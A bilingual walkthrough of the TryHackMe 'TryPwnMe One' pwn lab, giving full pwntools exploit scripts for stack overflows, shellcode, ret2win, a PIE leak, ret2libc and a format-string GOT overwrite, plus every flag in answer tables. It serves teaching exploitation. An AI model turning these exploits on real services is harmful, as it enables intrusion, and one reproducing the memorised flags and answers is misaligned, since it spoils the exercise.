# TryPwnMe One
| **Dificultad** | Medium |
| **Tipo** | Walkthrough |
| **Slug** | `trypwnmeone` |
| **Link** | [TryHackMe](https://tryhackme.com/room/trypwnmeone) |
| **Sección** | Binary Exploitation / Pwn |
| **Fuente** | Writeup de TryHackMe |
| **Componentes** | Buffer overflow de pila, overwrite de variables, shellcode, ret2win, leak de PIE/ASLR, ret2libc con GOT/PLT, format string, GOT overwrite |
| **Impacto** | Sala introductoria de explotación de binarios (pwn) que encadena siete retos progresivos: desde un overflow que sobrescribe una variable hasta ret2libc y format strings para tomar control de la ejecución y leer `flag.txt`. |
---
**Contexto:** TryPwnMe One es una sala de TryHackMe dedicada a la explotación de binarios (binary exploitation / pwn). A lo largo de nueve tareas se resuelven siete retos progresivos que cubren buffer overflow de pila, sobrescritura de variables locales, ejecución de shellcode, ret2win, bypass de PIE/ASLR mediante leaks, ret2libc usando PLT/GOT y, finalmente, una vulnerabilidad de format string con overwrite de la GOT. El objetivo en cada reto es ejecutar una shell o revelar el fichero `flag.txt` en el objetivo remoto.
*EN: TryPwnMe One is a TryHackMe room dedicated to binary exploitation (pwn). Across nine tasks it solves seven progressive challenges covering stack buffer overflow, local variable overwrite, shellcode execution, ret2win, PIE/ASLR bypass through leaks, ret2libc using PLT/GOT, and finally a format string vulnerability with GOT overwrite. The goal of each challenge is to spawn a shell or read the `flag.txt` file on the remote target.*
## Solucionario
### Task 1: Introduction
**Explicación:** Tarea introductoria de la sala. Se presentan los objetivos, la metodología de explotación de binarios y el material descargable (binarios vulnerables, `libc.so.6` y fichero `flag.txt`). No requiere enviar ninguna respuesta; basta con comprender el flujo de trabajo que se seguirá en los retos posteriores.
*EN: Introductory task. It presents the objectives, the binary exploitation methodology, and the downloadable material (vulnerable binaries, `libc.so.6`, and `flag.txt`). It requires no answer; understanding the workflow used in the following challenges is enough.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Are you ready to start the room? | `No answer needed` |
### Task 2: Deploy / Access
**Explicación:** Tarea de despliegue y conexión. Se arranca la máquina objetivo y se toma nota de la dirección IP; los binarios se sirven en distintos puertos (`9003`–`9009`) de la IP desplegada. No requiere enviar respuesta.
*EN: Deployment and connection task. Start the target machine and note the IP address; the binaries are served on different ports (`9003`–`9009`) of the deployed IP. No answer required.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Deploy the machine and note the IP address | `No answer needed` |
### Task 3: TryOverflowMe 1
**Explicación:** Primer reto de buffer overflow. El programa declara una variable `admin = 0` y un buffer `char buf[0x10]` (16 bytes) sobre el que llama a `gets(buf)`, función que no valida el tamaño y permite escribir más allá del buffer. El objetivo es sobrescribir la variable `admin` para que la comprobación `if (admin)` sea verdadera y el programa imprima la flag.
Código de referencia:
```c
int main(){
    setup();
    banner();
    int admin = 0;
    char buf[0x10];

    puts("PLease go ahead and leave a comment :");
    gets(buf);

    if (admin){
        const char* filename = "flag.txt";
        FILE* file = fopen(filename, "r");
        char ch;
        while ((ch = fgetc(file)) != EOF) {
            putchar(ch);
        }
        fclose(file);
    }
    else{
        puts("Bye bye\n");
        exit(1);
    }
}
```
Identificamos la vulnerabilidad: `char buf[0x10]` reserva solo 16 bytes y `gets(buf)` escribe sin límite. Para pasar el chequeo `if (admin)` sobrescribimos la variable `admin`.
Localizamos las variables con el desensamblado de `main`:
```text
$ gdb -batch ./materials-TryPwnMeOne/TryOverFlowMe1/overflowme1 -ex 'disassemble main'
...
    0x00000000004008f6 <+28>:    mov    DWORD PTR [rbp-0x4],0x0
...
    0x0000000000400909 <+47>:    lea    rax,[rbp-0x30]
    0x000000000040090d <+51>:    mov    rdi,rax
    0x0000000000400910 <+54>:    mov    eax,0x0
    0x0000000000400915 <+59>:    call   0x400680 <gets@plt>
...
```
`buf` está en `rbp-0x30` y `admin` en `rbp-0x4`, por lo que `admin` se alcanza a los `44` bytes (`0x30 - 0x4`) desde el inicio del buffer. El exploit con `pwntools`:
```python
#!/usr/bin/env python3
from pwn import *

context.log_level = "error"

r = remote("10.10.74.205", 9003)

payload = b"A" * 44     # offset to the admin variable
payload += p64(1)       # overwrite the admin variable with 1

r.recvuntil(b"Please go ahead and leave a comment :\n")
r.sendline(payload)
print(r.recvline().decode())
r.close()
```
Al ejecutarlo obtenemos la flag. El overflow debe quedar EXACTO: `THM{Oooooooooooooovvvvverrrflloowwwwww}` (tres r, luego f, luego ll, luego oo).
*EN: First buffer overflow challenge. `gets(buf)` allows writing past the 16-byte `buf` and overwriting the local `admin` variable. Offset to `admin` is 44 bytes; writing `p64(1)` makes the `if (admin)` check true and the flag is printed.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the content of the file flag.txt on the target? | `THM{Oooooooooooooovvvvverrrflloowwwwww}` |
### Task 4: TryOverflowMe 2
**Explicación:** Segundo reto de overflow. La vulnerabilidad es la misma que en TryOverflowMe 1, pero ahora `admin` debe valer exactamente `0x59595959` y hay otras variables (`guess`, `check`) entre el buffer y `admin`.
Código de referencia:
```c
int read_flag(){
        const char* filename = "flag.txt";
        FILE* file = fopen(filename, "r");
        if(!file){
            puts("the file flag.txt is not in the current directory, please contact support\n");
            exit(1);
        }
        char ch;
        while ((ch = fgetc(file)) != EOF) {
        putchar(ch);
    }
    fclose(file);
}

int main(){

    setup();
    banner();
    int admin = 0;
    int guess = 1;
    int check = 0;
    char buf[64];

    puts("Please Go ahead and leave a comment :");
    gets(buf);

    if (admin==0x59595959){
            read_flag();
    }
    else{
        puts("Bye bye\n");
        exit(1);
    }
}
```
Localizamos las variables en la pila:
```text
$ gdb -batch ./materials-TryPwnMeOne/TryOverFlowMe2/overflowme2 -ex 'disassemble main'
...
    0x000000000040096c <+28>:    mov    DWORD PTR [rbp-0x4],0x0
    0x0000000000400973 <+35>:    mov    DWORD PTR [rbp-0x8],0x1
    0x000000000040097a <+42>:    mov    DWORD PTR [rbp-0xc],0x0
...
    0x000000000040098d <+61>:    lea    rax,[rbp-0x50]
    0x0000000000400991 <+65>:    mov    rdi,rax
    0x0000000000400994 <+68>:    mov    eax,0x0
    0x0000000000400999 <+73>:    call   0x400680 <gets@plt>
...
```
Disposición: `buf` en `rbp-0x50`, `check` en `rbp-0xc`, `guess` en `rbp-0x8` y `admin` en `rbp-0x4`. Por tanto `admin` se alcanza a los `76` bytes (`0x50 - 0x4`). Adaptamos el exploit ajustando offset y valor:
```python
#!/usr/bin/env python3
from pwn import *

context.log_level = "error"

r = remote("10.10.74.205", 9004)

payload = b"A" * 76         # offset to the admin variable
payload += p32(0x59595959)  # overwrite the admin variable with 0x59595959

r.recvuntil(b"Please go ahead and leave a comment :\n")
r.sendline(payload)
print(r.recvline().decode())
r.close()
```
Al ejecutarlo obtenemos la segunda flag.
*EN: Same overflow as before, but `admin` must equal `0x59595959` and other locals sit between the buffer and `admin`. Offset is 76 bytes; write `p32(0x59595959)` to pass the check.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the content of the file flag.txt on the target? | `THM{why_just_the_A_have_all_theFun?}` |
### Task 5: TryExecMe
**Explicación:** Tercer reto. No hay buffer overflow: el programa lee nuestra entrada en `buf`, la castea a un puntero a función y la ejecuta con `((void (*)()) buf)()`. Es decir, ejecuta directamente cualquier byte que enviemos. La solución es inyectar shellcode que lance `/bin/sh`.
Código de referencia:
```c
int main(){
    setup();
    banner();
    char *buf[128];

    puts("\nGive me your shell, and I will execute it: ");
    read(0,buf,sizeof(buf));
    puts("\nExecuting Spell...\n");

    ( ( void (*) () ) buf) ();

}
```
Proporcionamos shellcode que lanza una shell mediante `pwntools`:
```python
#!/usr/bin/env python3
from pwn import *

context.update(os="linux", arch="amd64", log_level="error")

r = remote("10.10.74.205", 9005)
payload = asm(shellcraft.sh())      # generates a shellcode that spawns /bin/sh

r.recvuntil(b"Give me your shell, and I will execute it: \n")
r.sendline(payload)
r.recvuntil(b"Executing Spell...\n\n")
# r.interactive()                   # uncomment for an interactive shell
r.sendline(b"cat flag.txt")
print(r.recvline().decode())
r.close()
```
Con esto obtenemos la tercera flag.
*EN: No overflow here: the program casts our input to a function pointer and calls it. The input is executed as code, so injecting `shellcraft.sh()` shellcode spawns a shell and we read the flag.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the content of the file flag.txt on the target? | `THM{Tr1Execm3_with_s0m3_sh3llc0de_w00t}` |
### Task 6: TryRetMe
**Explicación:** Cuarto reto (ret2win). El binario declara `char *buf[0x20]` (256 bytes reales, porque cada elemento es un puntero de 8 bytes) y hace `read(0, buf, 0x200)`, desbordando el buffer. No hay variables que sobrescribir, pero existe una función `win()` que ejecuta `system("/bin/sh")`. Sobrescribimos la dirección de retorno con la de `win`.
Código de referencia:
```c
int win(){
     system("/bin/sh");
}

void vuln(){
    char *buf[0x20];
    puts("Return to where? : ");
    read(0, buf, 0x200);
    puts("\nok, let's go!\n");
}

int main(){
    setup();
    vuln();
}
```
> Los elementos del array son `char *` (8 bytes cada uno), no `char`. Por eso el buffer es `0x20 * 8 = 256 (0x100)` bytes.

Confirmamos en el desensamblado de `vuln`:
```text
$ gdb -batch ./materials-TryPwnMeOne/TryRetMe/tryretme -ex 'disassemble vuln'
...
    0x000000000040120f <+27>:    lea    rax,[rbp-0x100]
    0x0000000000401216 <+34>:    mov    edx,0x200
    0x000000000040121b <+39>:    mov    rsi,rax
    0x000000000040121e <+42>:    mov    edi,0x0
    0x0000000000401223 <+47>:    call   0x401090 <read@plt>
```
Sobrescribimos la dirección de retorno (situada justo después del RBP) con la dirección de `win`. Payload:
```python
#!/usr/bin/env python3
from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF(
    "./materials-TryPwnMeOne/TryRetMe/tryretme", checksec=False
)

r = remote("10.10.74.205", 9006)

rop = ROP(binary)
ret = rop.find_gadget(["ret"])[0]
win_function_address = binary.symbols["win"]

payload = b"A" * 256                        # offset to the RBP
payload += b"B" * 8                         # overwrite the RBP
payload += p64(ret)                         # overwrite the return address with the ret instruction for stack allignment
payload += p64(win_function_address)        # address of the win function

r.recvuntil(b"Return to where? : \n")
r.sendline(payload)
r.recvuntil(b"ok, let's go!\n\n")
# r.interactive()                           # uncomment for an interactive shell
r.sendline(b"cat flag.txt")
print(r.recvline().decode())
r.close()
```
### Stack Allignment
Se incluye un gadget `ret` antes de saltar a `win` para alinear la pila. Sin él, el programa crashea al alcanzar la instrucción `movaps`, que usa registros `xmm` de 16 bytes y requiere que la pila esté alineada a 16 bytes (`0x7ffc7e10b478 % 16 = 8`). Versión sin `ret` (falla):
```python
#!/usr/bin/env python3
from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF(
    "./materials-TryPwnMeOne/TryRetMe/tryretme", checksec=False
)

r = process()
gdb.attach(r)

win_function_address = binary.symbols["win"]

payload = b"A" * 256                    # offset to the RBP
payload += b"B" * 8                     # overwrite the RBP
payload += p64(win_function_address)    # address of the win function

r.recvuntil(b"Return to where? : \n")
r.sendline(payload)
r.recvuntil(b"ok, let's go!\n\n")
r.interactive()
```
*EN: Ret2win challenge. `read` overflows `buf`; overwrite the saved RBP (8 bytes) and the return address with the address of `win` (which calls `system("/bin/sh")`). A `ret` gadget is prepended for 16-byte stack alignment, otherwise `movaps` crashes.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the content of the file flag.txt on the target? | `THM{a_r3t_to_w1n_by_thm}` |
### Task 7: Random Memories
**Explicación:** Quinto reto. Es igual que TryRetMe pero ahora el binario tiene PIE habilitado, por lo que no podemos conocer de antemano la dirección de `win`. Sin embargo, antes de leer la entrada el programa imprime la dirección de `vuln` (`printf("I can give you a secret %llx\n", &vuln);`). Conociendo el offset de `vuln` dentro del binario calculamos la base donde se ha cargado y, a partir de ahí, la dirección de `win`.
Código de referencia:
```c
int win(){
    system("/bin/sh\0");
}

void vuln(){
    char *buf[0x20];
    printf("I can give you a secret %llx\n", &vuln);
    puts("Where are we going? : ");
    read(0, buf, 0x200);
    puts("\nok, let's go!\n");
}

int main(){
    setup();
    banner();
    vuln();
}
```
Comparación de protecciones con `checksec`:
```text
$ checksec ./materials-TryPwnMeOne/TryRetMe/tryretme
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

$ checksec ./materials-TryPwnMeOne/RandomMemories/random
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
Con PIE + ASLR el binario se carga en una dirección aleatoria. El leak de `&vuln` nos permite calcular la base (`base = vuln_leak - symbol("vuln")`) y así obtener `win`. Exploit:
```python
#!/usr/bin/env python3
from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF("./materials-TryPwnMeOne/RandomMemories/random", checksec=False)

r = remote("10.10.74.205", 9007)

r.recvuntil(b"I can give you a secret ")
vuln_address = int(r.recvline().rstrip().decode(), 16)  # parse the printed address of the vuln function
print(f"[+] Got the vuln function address: {hex(vuln_address)}")

binary_base_address = vuln_address - binary.symbols["vuln"] # calculate the base address the binary is loaded
print(f"[+] Calculated the binary base address: {hex(binary_base_address)}")

binary.address = binary_base_address    # set the binary base address to match the process's memory layout
win_address = binary.symbols["win"]
print(f"[+] Calculated the win function address: {hex(win_address)}")

rop = ROP(binary)
ret = rop.find_gadget(["ret"])[0]

payload = b"A" * 256                # offset to the RBP
payload += b"B" * 8                 # overwrite the RBP
payload += p64(ret)                 # ret instruction for stack alignment
payload += p64(win_address)         # calculated address of the win function

r.recvuntil(b"Where are we going? : \n")
r.sendline(payload)
r.recvuntil(b"ok, let's go!\n\n")
# r.interactive()                   # uncomment for an interactive shell
r.sendline(b"cat flag.txt")
print(r.recvline().decode())
r.close()
```
*EN: Same as TryRetMe but PIE is enabled. The program leaks `&vuln`, allowing us to compute the binary base and then the address of `win`. ASLR is defeated by the leak.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the content of the file flag.txt on the target? | `THM{Th1s_R4ndom_acc3ss_m3mories_tututut_byp4ssed}` |
### Task 8: The Librarian
**Explicación:** Sexto reto (ret2libc). Hay de nuevo un buffer overflow en `vuln` (`read(0, buf, 0x200)` sobre `char *buf[0x20]`), pero no existe función `win` ni variable que sobrescribir. PIE no está habilitado, así que podemos saltar a cualquier dirección del binario, pero nada en él nos da la flag. El binario está enlazado con `libc`, que contiene `system`; el problema es que `libc` sí tiene PIE/ASLR. La técnica consiste en filtrar (leak) una dirección de `libc` a través de la GOT/PLT y volver a ejecutar `vuln` para, con la base conocida, llamar a `system("/bin/sh")`.
Código de referencia:
```c
void vuln(){
    char *buf[0x20];
    puts("Again? Where this time? : ");
    read(0, buf, 0x200);
    puts("\nok, let's go!\n");
    }

int main(){
    setup();
    vuln();

}
```
Protecciones:
```text
$ checksec ./materials-TryPwnMeOne/TheLibrarian/thelibrarian
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'.'

$ checksec ./materials-TryPwnMeOne/TheLibrarian/libc.so.6
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
Recordatorio PLT/GOT: la GOT almacena las direcciones resueltas de funciones/variables globales y la PLT facilita llamar funciones externas. La primera llamada a `puts` resuelve su dirección real en libc y actualiza su entrada GOT; llamadas posteriores usan esa dirección. Como el binario llama a `puts` antes de leer nuestra entrada, la entrada `puts@got` ya está resuelta. Llamando a `puts(puts@got)` imprimimos la dirección de `puts` en libc, calculamos la base de libc y así `system` y `/bin/sh`. Necesitamos el gadget `pop rdi; ret` para pasar el argumento por RDI (convención x64). Fase de leak:
```python
#!/usr/bin/env python3
from pwn import *

context.update(os="linux", arch="amd64", log_level="error")

binary = ELF("./materials-TryPwnMeOne/TheLibrarian/thelibrarian", checksec=False)
libc = ELF("./materials-TryPwnMeOne/TheLibrarian/libc.so.6", checksec=False)

r = remote("10.10.74.205", 9008)

rop = ROP(binary)
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

payload = b"A" * 256                # offset to the RBP
payload += b"B" * 8                 # overwrite the RBP
payload += p64(ret)                 # ret for stack alignment
payload += p64(pop_rdi_ret)         # pop rdi gadget
payload += p64(binary.got["puts"])  # value for rdi
payload += p64(binary.plt["puts"])  # call puts

r.recvuntil(b"Again? Where this time? : ")
r.sendline(payload)
r.recvuntil(b"ok, let's go!\n\n")

leaked_puts = u64(r.recvline().rstrip().ljust(8, b"\x00")) # parse the leaked address
print(f"[+] Leaked address of puts from the GOT entry: {hex(leaked_puts)}")
libc_base_address = leaked_puts - libc.symbols["puts"] # calculate the base address of libc
print(f"[+] Calculated base address of libc: {hex(libc_base_address)}")
```
Tras filtrar, en lugar de salir hacemos que el programa vuelva a ejecutar `vuln`; así reexplotamos el overflow con la base de libc conocida y llamamos a `system("/bin/sh")`:
```python
#!/usr/bin/env python3
from pwn import *

context.update(os="linux", arch="amd64", log_level="error")

binary = ELF("./materials-TryPwnMeOne/TheLibrarian/thelibrarian", checksec=False)
libc = ELF("./materials-TryPwnMeOne/TheLibrarian/libc.so.6", checksec=False)

r = remote("10.10.74.205", 9008)

rop = ROP(binary)
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

payload = b"A" * 256                        # offset to the RBP
payload += b"B" * 8                         # overwrite the RBP
payload += p64(ret)                         # ret for stack alignment
payload += p64(pop_rdi_ret)                 # pop rdi gadget
payload += p64(binary.got["puts"])          # value for rdi
payload += p64(binary.plt["puts"])          # call puts
payload += p64(binary.symbols["vuln"])      # jump back to vuln

r.recvuntil(b"Again? Where this time? : ")
r.sendline(payload)
r.recvuntil(b"ok, let's go!\n\n")

leaked_puts = u64(r.recvline().rstrip().ljust(8, b"\x00")) # parse the leaked address
print(f"[+] Leaked address of puts from the GOT entry: {hex(leaked_puts)}")
libc_base_address = leaked_puts - libc.symbols["puts"] # calculate the base address of libc
print(f"[+] Calculated the base address of LIBC: {hex(libc_base_address)}")
libc.address = libc_base_address                # set the libc base address to match the remote process's memory layout

r.recvuntil(b"Again? Where this time? : ")
payload2 = b"A" * 256                           # offset to the RBP
payload2 += b"B" * 8                            # overwrite the RBP
payload2 += p64(pop_rdi_ret)                    # pop rdi gadget
# The libc library already includes the /bin/sh string.
# We can use the search function to find its address in libc.
# Once we have this address, we can use the same gadget to set it as an argument for the system function.
payload2 += p64(next(libc.search(b"/bin/sh")))  # value of rdi
payload2 += p64(libc.symbols["system"])         # call system("/bin/sh")

r.sendline(payload2)
r.recvuntil(b"ok, let's go!\n\n")
# r.interactive()                               # uncomment for an interactive shell
r.sendline(b"cat flag.txt")
print(r.recvline().decode())
r.close()
```
*EN: Ret2libc. Leak a libc address via `puts@got`/`puts@plt`, return to `vuln`, then call `system("/bin/sh")` using the leaked libc base. `pop rdi; ret` passes the argument.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the content of the file flag.txt on the target? | `THM{YAY_You_r3t_t0_libc_well_d0n3}` |
### Task 9: Not Specified
**Explicación:** Séptimo y último reto (format string). El binario lee exactamente `sizeof(username)` bytes, por lo que no hay overflow, pero pasa nuestra entrada directamente a `printf(username)`, creando una vulnerabilidad de format string. Podemos usar `%p`/`%c` para leer la pila y `%n` para escribir en memoria. Aprovechamos que el binario llama a `puts` después del `printf` y sobrescribimos su entrada GOT con la dirección de `win`, de modo que la siguiente llamada a `puts` ejecute `win`.
Código de referencia:
```c
int win(){
    system("/bin/sh\0");
}

int main(){
    setup();
    banner();
    char *username[32];
    puts("Please provide your username\n");
    read(0,username,sizeof(username));
    puts("Thanks! ");
    printf(username);
    puts("\nbye\n");
    exit(1);
}
```
No hay overflow, pero sí format string:
```c
char *username[32];
puts("Please provide your username\n");
read(0,username,sizeof(username));
```
La entrada se pasa directamente a `printf`:
```c
printf(username);
```
Con `%p` leemos valores de la pila:
```text
$ nc 10.10.74.205 9009
...
Please provide your username
%p
Thanks! 0x7fa6639cd723
```
Nuestra entrada es el sexto elemento de la pila:
```text
$ nc 10.10.74.205 9009
Please provide your username
AAAAAAAA%p.%p.%p.%p.%p.%p
Thanks! AAAAAAAA0x7f31fa505723.(nil).0x7f31fa426297.0x9.0x4.0x4141414141414141
```
Referenciándola directamente con `%6$p`:
```text
$ nc 10.10.74.205 9009
Please provide your username
AAAAAAAA%6$p
Thanks! AAAAAAAA0x4141414141414141
```
`%n` escribe el número de caracteres impresos hasta el momento en la dirección indicada. Al ejecutar el script siguiente el programa crashea dentro de `printf` porque intenta escribir el valor `8` en `0x4141414141414141`, una dirección inválida:
```python
#!/usr/bin/env python3
from pwn import *

context.update(os="linux", arch="amd64", log_level="error")

r = process("./materials-TryPwnMeOne/NotSpecified/notspecified")
gdb.attach(r)

payload = b"A" * 8
payload += b"%6$n"

r.recvuntil(b"Please provide your username\n")
r.sendline(payload)
r.interactive()
```
Sabemos que `puts` se llama antes de leer nuestra entrada y después de `printf`. Tras la primera llamada, `puts@got` contiene la dirección resuelta de `puts` en libc, y las llamadas posteriores usan esa entrada. Sobrescribiendo `puts@got` con la dirección de `win`, la siguiente llamada a `puts` ejecutará `win`.
### Creating the Payload Manually
Colocamos la entrada después de los especificadores de formato, porque las direcciones contienen bytes nulos (`0x00`) que detendrían la impresión de `printf`:
```python
#!/usr/bin/env python3
from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF("./materials-TryPwnMeOne/NotSpecified/notspecified", checksec=False)

r = process()
payload = b"%12$p %13$p %14$p %15$p".ljust(48, b"-")
payload += b"A"*8
payload += b"B"*8
payload += b"C"*8
payload += b"D"*8

r.recvuntil(b"Please provide your username\n")
r.sendline(payload)
print(r.recvall().decode())
r.close()
```
Localizamos nuestra entrada en la pila con los offsets 12, 13, 14 y 15:
```text
$ python3 exploit.py
Thanks! 0x4141414141414141 0x4242424242424242 0x4343434343434343 0x4444444444444444-------------------------AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD

 bye
```
Obtenemos la dirección de `win` con `readelf`:
```text
$ readelf -s ./materials-TryPwnMeOne/NotSpecified/notspecified | grep win
    62: 00000000004011f6    23 FUNC    GLOBAL DEFAULT   15 win
```
Como escribir `0x4011f6` caracteres es impracticable, escribimos la dirección por partes. Primero ponemos a cero la dirección usando `%lln` (escribe el contador como `long long int` de 8 bytes; como aún no se han impreso caracteres, deja la dirección a cero):
```python
#!/usr/bin/env python3
from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF("./materials-TryPwnMeOne/NotSpecified/notspecified", checksec=False)

puts_got = binary.got["puts"]

r = process()
gdb.attach(r)

payload = b"%12$lln %13$p %14$p %15$p".ljust(48, b"-")
payload += p64(puts_got)
payload += b"B"*8
payload += b"C"*8
payload += b"D"*8

r.recvuntil(b"Please provide your username\n")
r.sendline(payload)
r.interactive()
r.close()
```
Verificamos en GDB:
```text
pwndbg> x/gx &'puts@got.plt'
0x404020 <puts@got.plt>:        0x0000000000000000
```
A continuación escribimos el byte menos significativo (`0xf6`) de `win` (`0x4011f6`): imprimimos `246` caracteres (`0xf6`) con `%246c` y usamos `%13$n` para escribir ese valor:
```python
#!/usr/bin/env python3
from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF("./materials-TryPwnMeOne/NotSpecified/notspecified", checksec=False)

puts_got = binary.got["puts"]

r = process()
gdb.attach(r)

payload = b"%12$lln%246c%13$n %14$p %15$p".ljust(48, b"-")
payload += p64(puts_got)
payload += p64(puts_got)
payload += b"C"*8
payload += b"D"*8

r.recvuntil(b"Please provide your username\n")
r.sendline(payload)
r.interactive()
r.close()
```
Comprobación:
```text
pwndbg> x/gx &'puts@got.plt'
0x404020 <puts@got.plt>:        0x00000000000000f6
```
Ahora escribimos `0x11`, el segundo byte menos significativo. Ya se han impreso `246` caracteres (más que `0x11`), así que imprimimos `27` bytes adicionales para que el contador total sea `273` (`0x111`). Usamos el sub-especificador de longitud `hh` (`char`) con `%n` para escribir solo el byte menos significativo (`0x11`) del contador. Aumentamos la dirección para que `printf` escriba en el byte siguiente:
```python
#!/usr/bin/env python3
from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF("./materials-TryPwnMeOne/NotSpecified/notspecified", checksec=False)

puts_got = binary.got["puts"]

r = process()
gdb.attach(r)

payload = b"%12$lln%246c%13$n%27c%14$hhn %15$p".ljust(48, b"-")
payload += p64(puts_got)
payload += p64(puts_got)
payload += p64(puts_got+1)
payload += b"D"*8

r.recvuntil(b"Please provide your username\n")
r.sendline(payload)
r.interactive()
r.close()
```
```text
pwndbg> x/gx &'puts@got.plt'
0x404020 <puts@got.plt>:        0x00000000000011f6
```
Por último, para escribir el byte `0x40` necesitamos imprimir `47` caracteres adicionales para que el contador total sea `0x140`:
- `0x140` (total de caracteres necesarios) - `0x111` (caracteres ya impresos) = `0x2f` (47 caracteres adicionales).
```python
#!/usr/bin/env python3
from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF("./materials-TryPwnMeOne/NotSpecified/notspecified", checksec=False)

puts_got = binary.got["puts"]

r = process()
payload = b"%12$lln%246c%13$n%27c%14$hhn%47c%15$hhn".ljust(48, b"-")
payload += p64(puts_got)
payload += p64(puts_got)
payload += p64(puts_got+1)
payload += p64(puts_got+2)

r.recvuntil(b"Please provide your username\n")
r.sendline(payload)
r.interactive()
r.close()
```
Con esto sobrescribimos `puts@got` con la dirección de `win`:
```text
pwndbg> x/gx &'puts@got.plt'
0x404020 <puts@got.plt>:        0x00000000004011f6
```
Finalmente adaptamos el script al objetivo remoto para obtener la shell:
```python
#!/usr/bin/env python3
from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF("./materials-TryPwnMeOne/NotSpecified/notspecified", checksec=False)

puts_got = binary.got["puts"]

r = remote("10.10.74.205", 9009)
payload = b"%12$lln%246c%13$n%27c%14$hhn%47c%15$hhn".ljust(48, b"-")
payload += p64(puts_got)
payload += p64(puts_got)
payload += p64(puts_got+1)
payload += p64(puts_got+2)

r.recvuntil(b"Please provide your username\n")
r.sendline(payload)
r.interactive()
r.close()
```
```text
$ python3 exploit.py
Thanks!
...
$ id
uid=1000 gid=1000 groups=1000
$ wc -c flag.txt
37 flag.txt
```
### Using pwntools for Payload Generation
En lugar de construir el payload manualmente, podemos usar `fmtstr_payload` de `pwntools` indicando el offset de nuestra entrada en la pila, la dirección donde escribir y el valor a escribir:
```python
#!/usr/bin/env python3
from pwn import *

context.update(os="linux", arch="amd64", log_level = "error")
context.binary = binary = ELF("./materials-TryPwnMeOne/NotSpecified/notspecified", checksec=False)

r = remote("10.10.74.205", 9009)
payload = fmtstr_payload(6, {binary.got["puts"] : binary.symbols["win"]})
r.sendline(payload)
r.interactive()
r.close()
```
*EN: Format string challenge. Input goes straight to `printf`, giving arbitrary read/write. Overwrite `puts@got` with the address of `win` byte by byte using `%n` (or `fmtstr_payload`); the next `puts` call then executes `win`.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the content of the file flag.txt on the target? | `THM{l3arn1ng_f0rm4t_str1ngs_awes0m3}` |
## Respuestas (tabla unificada)
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Are you ready to start the room? | `No answer needed` |
| 2 | Deploy the machine and note the IP address | `No answer needed` |
| 3 | What is the content of the file flag.txt on the target? | `THM{Oooooooooooooovvvvverrrflloowwwwww}` |
| 4 | What is the content of the file flag.txt on the target? | `THM{why_just_the_A_have_all_theFun?}` |
| 5 | What is the content of the file flag.txt on the target? | `THM{Tr1Execm3_with_s0m3_sh3llc0de_w00t}` |
| 6 | What is the content of the file flag.txt on the target? | `THM{a_r3t_to_w1n_by_thm}` |
| 7 | What is the content of the file flag.txt on the target? | `THM{Th1s_R4ndom_acc3ss_m3mories_tututut_byp4ssed}` |
| 8 | What is the content of the file flag.txt on the target? | `THM{YAY_You_r3t_t0_libc_well_d0n3}` |
| 9 | What is the content of the file flag.txt on the target? | `THM{l3arn1ng_f0rm4t_str1ngs_awes0m3}` |
---
**Metodología:** Enumeración del binario (`checksec`, `file`, `gdb disassemble`) → identificación de la vulnerabilidad (gets/read sin límite, format string) → cálculo de offsets → explotación (overwrite de variable, shellcode, ret2win, leak PIE/ASLR, ret2libc vía GOT/PLT, GOT overwrite con format string) → spawn de shell → lectura de `flag.txt`.
**Learning chain:** buffer overflow → overwrite de variable local → shellcode → ret2win → bypass PIE/ASLR (leak) → ret2libc (GOT/PLT + pop rdi) → format string + GOT overwrite → shell y flags.
**Lección:** *Cada función insegura (`gets`, `read` sin límites, `printf(user_input)`) sumada a una protección ausente abre una vía distinta de explotación; dominar offsets, ROP y fugas de memoria permite encadenar técnicas hasta el control total de la ejecución.*
**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1068 (Exploitation for Privilege Escalation), T1059.004 (Unix Shell), T1203 (Exploitation for Client Execution).
**Fuente:** [TryHackMe - TryPwnMe One](https://tryhackme.com/room/trypwnmeone)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
